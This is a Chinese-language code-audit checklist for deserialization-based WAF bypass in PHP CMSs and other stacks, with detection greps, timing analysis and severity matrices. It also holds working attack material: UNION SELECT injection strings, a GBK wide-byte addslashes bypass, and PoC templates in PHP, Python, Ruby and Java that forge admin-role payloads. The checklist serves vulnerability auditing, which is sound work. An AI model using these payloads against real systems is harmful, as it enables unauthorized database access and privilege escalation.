# 反序列化结果注入 / 安全过滤器旁路检查清单

> 漏洞类型: Deserialized Input Filter Bypass
> 独立于 Object Injection，关注"反序列化结果绕过 WAF/过滤器后到达危险 sink"这条路径。
> 真实案例来源: ECShop V3.0.0 search.php encode 参数（2018）

---

## 核心威胁模型

```
正常攻击路径（被 WAF 拦截）:
  $_GET['param'] = "1 UNION SELECT ..."
       │
       ▼
  filterData($_GET)  ← WAF 检测，触发拦截  ✗

旁路路径（本漏洞类型）:
  $_GET['encode'] = base64(serialize(['param' => '1 UNION SELECT ...']))
       │
       ▼
  unserialize()  → $arr = ['param' => '1 UNION SELECT ...']
       │             ← WAF 从未检查 $arr 本身
       ▼
  filterData($_GET/$_POST)  ← 仅过滤原始超全局变量，$arr 不在其中
       │
       ▼
  $_REQUEST = array_merge($_REQUEST, $arr)
       │
       ▼
  SQL/eval/header() sink  ← 攻击值到达  ✓
```

漏洞成立的三个必要条件（必须全部满足）：
1. `unserialize()` 返回的数组/对象被注入到超全局变量或全局数组
2. 系统 WAF/过滤函数不覆盖反序列化结果（仅过滤原始超全局变量）
3. 被注入的键值在后续代码中到达可利用的 sink

---

## 变体：Decode-After-WAF（Transform 中缀旁路）

> 本变体不依赖 merge 进超全局变量，是独立的旁路路径，跨 CMS 普遍存在。

### 威胁模型

```
核心架构缺陷（三段式）:
  [1] WAF 在 init 阶段检查原始超全局变量（编码/加密态）
               ↓  编码态字符串：无 SQL 关键字，WAF 通过
  [2] 业务逻辑对该值做 transform（urldecode/base64_decode/decrypt...）
               ↓  解码后字符串：含 SQL payload，WAF 已不再介入
  [3] unserialize → 数组字段 → SQL/eval sink（无二次保护）
```

### Transform 函数全谱

| 函数 | 编码态特征 | WAF 正则是否命中 | 典型出处 |
|---|---|---|---|
| `urldecode()` | `%27%20UNION%20SELECT` | ❌ 不命中 | ECShop admin/order.php |
| `rawurldecode()` | 同上，`%20`不转为`+` | ❌ 不命中 | 通用 |
| `base64_decode()` | `JVBER0i...`（字母数字+/=） | ❌ 不命中 | ECShop search.php、Discuz auth cookie |
| `gzuncompress()` / `gzdecode()` / `gzinflate()` | 二进制字节 | ❌ 不命中 | Joomla 视图状态、部分缓存模块 |
| `hex2bin()` | `27554e494f4e...`（十六进制） | ❌ 不命中 | 国产 CMS 自研参数 |
| `htmlspecialchars_decode()` | `&#39; UNION` / `&lt;script` | ⚠️ 部分命中（视正则） | ECShop search.php 内部 |
| `str_rot13()` | ROT13 偏移字符串 | ❌ 不命中 | 混淆场景 |
| 自定义 `sys_auth()` | 密文字符串 | ❌ 不命中 | PHPCMS V9 |
| 自定义 `authcode()` | 密文字符串 | ❌ 不命中 | Discuz 系 |

### 跨 CMS 真实案例

#### ECShop V3.0.0 — admin/order.php:227（urldecode）

```
执行时序:
  [行18]  require admin/includes/init.php
              → safety.php → filterData($_COOKIE)
              → $_COOKIE['ECSCP']['lastfilter'] = "%27%20UNION%20SELECT..." (已编码)
              → WAF 正则 union\b.*select\b → 未命中 → 通过
  [行227] $filter = unserialize(urldecode($_COOKIE['ECSCP']['lastfilter']));
              → urldecode 后: "' UNION SELECT 1,2,user()-- -"
              → unserialize → ['composite_status' => "' UNION SELECT..."]
  [行247] " AND o.order_status = '$filter[composite_status]' "
              → SQL 注入（后台管理员权限）
```

#### Discuz X3.4 — auth cookie（base64_decode）

```php
// source/include/cache/cache_thread.php 等多处
$var = unserialize(base64_decode($_COOKIE['auth']));
// WAF 检查 $_COOKIE['auth'] = "YToxOntz..." (base64，全字母数字)
// base64_decode 后含 SQL payload，直接进入后续查询
```

#### PHPCMS V9 — GET 参数自定义解密（sys_auth）

```php
// CNVD-2018-01221 核心路径
$siteid = sys_auth($_GET['siteid'], 'DECODE');
$data = unserialize($siteid);
// WAF 检查 $_GET['siteid'] = 密文，无法匹配 SQL 关键字
// sys_auth 解密后的明文含 SQL payload
```

#### ThinkPHP 3.x — 文件缓存路径（WAF 完全不覆盖）

```php
$data = unserialize(base64_decode(file_get_contents($cache_file)));
// source 来自文件系统，WAF 根本不在此路径上
// 若攻击者能写入缓存文件（结合文件写入漏洞），可触发
```

### 探测方法

```bash
# 一次性扫描所有 decode-unserialize 中缀组合
grep -rPn \
  "unserialize\s*\(\s*(urldecode|rawurldecode|base64_decode|gzuncompress|gzdecode|gzinflate|hex2bin|htmlspecialchars_decode|str_rot13)\s*\(" \
  --include="*.php" . | grep -v vendor

# 自定义 decode 函数（需先提取函数名）
grep -rPn "function\s+(sys_auth|authcode|decrypt|decode|decipher)\b" \
  --include="*.php" . | grep -v vendor
# 将上面发现的函数名代入：
grep -rPn "unserialize\s*\(\s*(sys_auth|authcode)\s*\(" \
  --include="*.php" . | grep -v vendor

# 对每个命中，确认 taint source 类型
# 优先级: $_COOKIE > $_GET > $_POST > $_SERVER > 文件读取
```

### 判定与评级

满足以下全部条件时报告：
1. `unserialize(decode_fn($taint_source))` 结构成立
2. WAF/filterData 检查的是 `$taint_source` 原始值（编码态）
3. unserialize 返回数组的某字段直接流入 SQL/eval/file sink（无充分二次保护）

| 条件组合 | 评级 |
|---|---|
| COOKIE/GET/POST taint + 直达 SQL 无保护 | 🔴 Critical |
| COOKIE/GET/POST taint + 直达 SQL + addslashes（UTF-8） | 🟡 Medium |
| COOKIE/GET/POST taint + 直达 eval/exec | 🔴 Critical |
| 文件缓存 taint（需先写文件）+ SQL/eval | 🟠 High（链式） |

---

### 1.1 查找反序列化后执行 merge/assign 的模式

```bash
# PHP
grep -rn "unserialize" --include="*.php" . | grep -v vendor
# 然后对每个命中，检查其后 20 行是否有注入超全局变量的操作
grep -A 20 "unserialize" {目标文件} | grep -E \
  "array_merge|array_replace|\\\$_REQUEST|\\\$_GET|\\\$_POST|\\\$_SESSION|\\\$_COOKIE|\\\\$GLOBALS"

# Python
grep -rn "pickle.loads\|yaml.load\|marshal.loads" --include="*.py" .
grep -A 10 "pickle.loads\|yaml.load" {目标文件} | grep -E \
  "request\.|session\[|g\.|app\.config|os\.environ"

# Ruby
grep -rn "Marshal.load\|YAML.load\|JSON.load" --include="*.rb" .
grep -A 10 "Marshal.load" {目标文件} | grep -E \
  "params\[|session\[|env\[|@[a-z]"

# Java
grep -rn "readObject\|fromXML\|readValue" --include="*.java" .
grep -A 10 "readObject()" {目标文件} | grep -E \
  "request\.setAttribute|session\.setAttribute|System\.setProperty"

# Node.js
grep -rn "deserialize\|fromJSON\|parse" --include="*.js" --include="*.ts" . | \
  grep -v "JSON.parse" | grep -v vendor
```

### 1.2 高危注入目标变量（按危险程度排序）

| 优先级 | 注入目标 | 语言 | 危险原因 |
|---|---|---|---|
| P0 | `$_REQUEST` | PHP | 覆盖全部请求参数，影响范围最广 |
| P0 | `$_GET` / `$_POST` | PHP | 直接污染原始输入来源 |
| P0 | `$_SESSION` | PHP | 持久化，触发二次利用 |
| P0 | `request.environ` | Python | 影响 WSGI 中间件 |
| P1 | `$_COOKIE` | PHP | 可持久化，绕过身份验证 |
| P1 | `session[]` | Ruby/Rails | 持久化越权 |
| P1 | `app.config` | Python/Flask | 可修改全局配置项 |
| P1 | `request.setAttribute` | Java | 影响后续过滤器/拦截器 |
| P2 | 普通局部数组 | 全部 | 需追踪具体 sink |

### 1.3 注入方式识别

```php
// 方式A: array_merge 直接覆盖
$_REQUEST = array_merge($_REQUEST, $unserializedData);

// 方式B: 逐键赋值
foreach ($unserializedData as $k => $v) {
    $_REQUEST[$k] = $v;
}

// 方式C: extract（最危险，可覆盖任意变量）
extract($unserializedData);

// 方式D: 条件注入（仅特定键）
if (isset($unserializedData['act'])) {
    $_REQUEST['act'] = $unserializedData['act'];
}
```

- [ ] 确认注入方式是全量 merge 还是选择性赋值
- [ ] `extract()` 注入需单独标记为 **Critical**（可覆盖任意变量名）
- [ ] 全量 merge 时，检查是否可覆盖安全敏感键（如 `role`、`is_admin`、`user_id`）

---

## 第二步：WAF / 过滤器时序分析

**核心问题：过滤器执行时，反序列化结果是否已经在其检查范围之内？**

### 2.1 建立执行时序图

```
检查方法：逐行阅读目标文件，标记关键事件的行号

事件类型：
  [A] WAF/filterData 执行行
  [B] unserialize() 执行行
  [C] 注入超全局变量行（array_merge 等）
  [D] sink 使用行（SQL/eval/header等）

时序判断：
  A 在 B 之前：WAF 过滤的是原始输入，反序列化结果不在覆盖范围 → 旁路成立
  A 在 C 之后：WAF 过滤时反序列化数据已注入 → 需检查 WAF 是否覆盖注入后的变量
  A 不存在：无 WAF → 直接评估 sink 可利用性
```

### 2.2 PHP 常见 WAF 旁路模式

```bash
# 识别 WAF 作用对象
grep -n "filterData\|filter_input\|htmlspecialchars\|addslashes\|strip_tags\|sanitize" \
     includes/safety.php includes/init.php {框架入口文件}

# 判断 WAF 是否覆盖 $unserializedData
# 典型旁路：WAF 只过滤 $_GET/$_POST/$_COOKIE/$_SERVER，不过滤中间变量
grep "filterData\|filterArray" includes/safety.php
```

常见旁路场景：

| WAF 覆盖对象 | 反序列化结果注入对象 | 是否旁路 |
|---|---|---|
| `$_GET`, `$_POST`, `$_COOKIE` | `$_REQUEST`（通过 array_merge） | ✅ 旁路（WAF 执行前 $_REQUEST 中没有恶意值） |
| `$_REQUEST`（WAF 在注入后执行） | `$_REQUEST` | ❌ 不旁路 |
| `$_GET`, `$_POST` | 局部变量 `$params` | ✅ 旁路（局部变量从未被过滤） |
| 全部输入（含 `$string`） | 任意 | ❌ 不旁路 |

### 2.3 其他语言 WAF 旁路模式

```python
# Python/Django: 中间件只检查 request.GET/POST
# 若反序列化结果直接赋值给 request.user 或 view 函数局部变量，可旁路
def view(request):
    data = pickle.loads(base64.b64decode(request.GET['d']))  # WAF 已过 request.GET
    user_id = data['user_id']  # 旁路：data 未经中间件过滤

# Ruby/Rails: before_action 过滤器只处理 params
# 若反序列化结果绕过 strong parameters 直接赋值，可旁路
def action
    obj = Marshal.load(Base64.decode64(params[:data]))
    @user.update(obj)  # 旁路：obj 未经 strong parameters 过滤
end

# Java/Spring: Filter 只处理 HttpServletRequest 原始参数
// 若反序列化对象直接设置到 request attribute，可绕过 Filter 检查
Object obj = ois.readObject();
request.setAttribute("data", obj);  // Filter 不检查 attribute
```

---

## 第三步：二次保护评估（决定实际可利用性）

**WAF 旁路成立 ≠ 漏洞可直接利用。必须评估每个 sink 上的第二层保护。**

### 3.1 PHP 常见 sink 与保护评估

| Sink 类型 | 常见保护函数 | 保护是否充分 | 备注 |
|---|---|---|---|
| SQL 拼接 `... LIKE '%$val%'` | `addslashes()` | UTF-8 下充分，GBK 下宽字节绕过 | 检查数据库字符集 |
| SQL 拼接（整数参数） | `intval()` | 充分 | 不可利用 |
| SQL 拼接（字符串，无引号） | 无 | 不充分 | 直接注入 |
| HTML 输出 | `htmlspecialchars()` | 充分（防XSS） | 不可利用 |
| `eval()` / `preg_replace /e` | 无 | 不充分 | RCE |
| `header()` | 无 / `\n`过滤 | 视过滤情况 | Header Injection |
| `file_get_contents()` / `include()` | 无 / `../`过滤 | 视过滤情况 | LFI/SSRF |
| `system()` / `exec()` | `escapeshellarg()` | 充分 | 不可利用 |

```bash
# 对每个被注入的键名，追踪其在后续代码中的所有使用
grep -n "\$_REQUEST\['keywords'\]\|\$_REQUEST\['act'\]\|\$_REQUEST\['sort'\]" \
     {目标文件} | grep -v "//\|#"

# 检查使用点是否有保护
# 特别关注没有 intval/htmlspecialchars/addslashes 的字符串拼接
```

### 3.2 GBK 宽字节旁路 `addslashes()` 检查

```bash
# 仅当数据库/连接字符集为 GBK/GB2312 时有效
grep -rn "set names gbk\|charset=gbk\|GB2312\|character_set" \
     data/config.php includes/cls_mysql.php

# 若为 GBK 且 addslashes 是唯一保护，则 SQL 注入可利用
# Payload: 0xbf27 → addslashes → 0xbf5c27 → MySQL 解析为 縗'（单引号逃逸）
```

### 3.3 其他语言 sink 评估

```python
# Python: 反序列化注入后的 sink
cursor.execute("SELECT * FROM t WHERE id='%s'" % data['id'])  # SQL注入
os.system(data['cmd'])                                         # RCE
open(data['path']).read()                                      # LFI
subprocess.call(data['args'], shell=True)                      # RCE

# Java
stmt.executeQuery("SELECT ... WHERE id='" + data.getId() + "'")  # SQL注入
Runtime.getRuntime().exec(data.getCommand())                      # RCE
new File(data.getPath()).exists()                                  # Path Traversal
```

---

## 第四步：特殊注入场景

### 4.1 覆盖安全敏感键（越权）

```bash
# 检查被注入的超全局变量是否有安全敏感键被后续直接使用
grep -n "REQUEST\['is_admin'\]\|REQUEST\['role'\]\|REQUEST\['user_id'\]\|\
REQUEST\['uid'\]\|REQUEST\['privilege'\]\|REQUEST\['verified'\]" {目标文件}

# 若全量 merge 且后续直接用这些键做权限判断，则可越权
# 示例：
$is_admin = $_REQUEST['is_admin'];  // 攻击者可注入 is_admin=1
```

- [ ] 检查是否可注入 `is_admin` / `role` / `uid` / `user_id` 等权限控制键
- [ ] 检查是否可注入 `PHPSESSID` / `token` / `csrf` 等会话控制键
- [ ] 检查 `extract($unserializedData)` 场景（可覆盖任意变量，包括 `$db`、`$config`）

### 4.2 SESSION 持久化注入

```bash
# 若反序列化结果注入 $_SESSION，攻击值持久化到会话文件
# 触发时机：后续请求中从 $_SESSION 读取该值时
grep -n "SESSION\[" {目标文件} | grep -v "//\|#"
grep -n "\\\$_SESSION\s*=" {目标文件}
```

- [ ] 确认 SESSION 中被注入的键是否在后续请求中用于 SQL/eval/file 操作
- [ ] SESSION 注入属于二阶利用，参考 `references/checklists/second_order.md`

### 4.3 COOKIE 持久化注入

```bash
grep -n "\\\$_COOKIE" {目标文件} | grep -E "merge|replace|extract|\\\$_COOKIE\s*="
```

- [ ] COOKIE 注入可绕过基于 COOKIE 的身份认证

### 4.4 HTTP Header 注入（header() sink）

```bash
# 若被注入键值用于 header()，可能导致 Response Splitting 或重定向劫持
grep -n "header\s*(" {目标文件} | grep -E "REQUEST|SESSION|GET|POST"
# 检查是否过滤了 \r\n（CRLF）
```

---

## 第五步：PoC 构造模板

### 5.1 PHP unserialize + array_merge 型

```php
<?php
// 构造注入数组
$payload = [
    'keywords' => "1' UNION SELECT 1,2,3,user(),5-- -",  // SQL注入示例
    // 'is_admin' => 1,                                   // 越权示例
    // 'act'      => 'dangerous_action',                  // 功能劫持示例
];

// 编码（与目标解码方式一致）
$encoded = base64_encode(serialize($payload));
echo "Payload URL: search.php?encode=" . urlencode($encoded) . "\n";

// 若目标做了 str_replace('+', '%2b', ...) 的特殊处理需对应调整
?>
```

### 5.2 Python pickle 注入型

```python
import pickle, base64

class Exploit(object):
    def __reduce__(self):
        return (dict, ({'role': 'admin', 'user_id': 1},))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(f"?data={payload}")
```

### 5.3 Ruby Marshal 注入型

```ruby
require 'base64'
payload = Base64.strict_encode64(Marshal.dump({'role' => 'admin', 'user_id' => 1}))
puts "?data=#{payload}"
```

### 5.4 Java readObject 注入（非 Gadget 链，属性覆盖）

```java
// 构造包含恶意属性的合法类对象（目标类必须已加载）
TargetClass obj = new TargetClass();
obj.setRole("admin");
obj.setUserId(1);
ByteArrayOutputStream bos = new ByteArrayOutputStream();
new ObjectOutputStream(bos).writeObject(obj);
String payload = Base64.getEncoder().encodeToString(bos.toByteArray());
System.out.println("payload: " + payload);
```

---

## 第六步：漏洞评级矩阵

| 条件组合 | 评级 | 说明 |
|---|---|---|
| WAF旁路 + 直达 SQL拼接（无二次保护） | 🔴 Critical | 前台未授权 SQL 注入 |
| WAF旁路 + 直达 eval/exec（无二次保护） | 🔴 Critical | 前台未授权 RCE |
| WAF旁路 + 覆盖 is_admin/role 等权限键 | 🔴 Critical | 前台未授权越权 |
| WAF旁路 + extract() 覆盖任意变量 | 🔴 Critical | 变量覆盖，影响面极广 |
| WAF旁路 + 直达 SQL拼接（addslashes 保护，GBK） | 🟠 High | GBK 环境可利用 |
| WAF旁路 + 直达 SQL拼接（addslashes 保护，UTF-8） | 🟡 Medium | 受限，需进一步验证 |
| WAF旁路 + SESSION持久化 + 后续二阶 sink | 🟠 High | 二阶利用 |
| WAF旁路 + 所有 sink 均有充分二次保护 | 🟡 Medium | WAF 架构缺陷，实际利用受限 |
| WAF旁路成立，但无后续 sink | 🔵 Low | 信息泄露风险 |
| WAF旁路不成立 | — | 不作为此类型报告 |

---

## 输出格式模板

```
[DESER_FILTER_BYPASS]
漏洞类型: Deserialized Input Filter Bypass
文件: {file}:{line}（unserialize 行）
注入目标: {$_REQUEST / $_SESSION / ...}（{file}:{line}）

时序分析:
  WAF 执行行: {行号}（覆盖: $_GET, $_POST, $_COOKIE）
  unserialize 执行行: {行号}
  注入发生行: {行号}
  WAF旁路成立: 是（WAF 在第{X}行执行，早于第{Y}行注入；$string 从未被 filterData 检查）

Sink 分析:
  {键名} → {sink类型} @ {file}:{line}
    二次保护: {addslashes / intval / htmlspecialchars / 无}
    字符集: {UTF-8 / GBK / 未知}
    可利用: {是 / 否 / 受限（原因）}

PoC:
  {base64(serialize(payload))} → {攻击效果}

评级: {Critical / High / Medium / Low}
评级依据: {WAF旁路 + sink类型 + 二次保护情况}
```

---

## 与其他检查清单的关联

| 后续分析 | 关联清单 | 触发条件 |
|---|---|---|
| 反序列化结果注入 SESSION，触发二阶 SQL/XSS | `second_order.md` | 注入目标为 $_SESSION |
| 旁路后到达 eval/include，需结合模板 gadget 分析 | `gadget.md` | sink 为代码执行类函数 |
| WAF 本身的正则可被绕过（双重旁路） | `php.md` § WAF Bypass | WAF 存在但正则存在缺陷 |
| 发现多个旁路漏洞可组合利用 | `chain_synthesis.md` | 单个漏洞评级 Medium，但可链式提升 |

---

*v1.1 — 2026-03-04 | 新增"Decode-After-WAF 变体"章节：Transform 函数全谱（8种）、*
*跨 CMS 真实案例（ECShop/Discuz/PHPCMS/ThinkPHP）、专项探测 grep、判定与评级矩阵*

*v1.0 — 2026-03-04 | 基于 ECShop V3.0.0 search.php encode 参数审计经验归纳*
